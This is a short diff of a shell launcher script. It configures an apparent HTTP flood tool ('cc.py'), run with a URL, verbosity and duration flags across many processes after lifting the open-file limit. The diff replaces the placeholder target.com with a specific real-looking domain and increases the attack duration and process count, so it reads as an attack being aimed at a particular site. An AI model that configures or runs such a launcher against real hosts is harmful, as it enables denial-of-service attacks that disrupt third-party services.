@@ -6,10 +6,10 @@
 #  Lastly run this script
 #
 #the command you want to exec
-atk_cmd="python3 cc.py -url http://target.com -v 4 -s 60"
+atk_cmd="python3 cc.py -url https://apiend.wxwczk.net -v 4 -s 600"
 
 #number of process that you want
-process=10
+process=15
 
 #change the system limit
 ulimit -n 999999
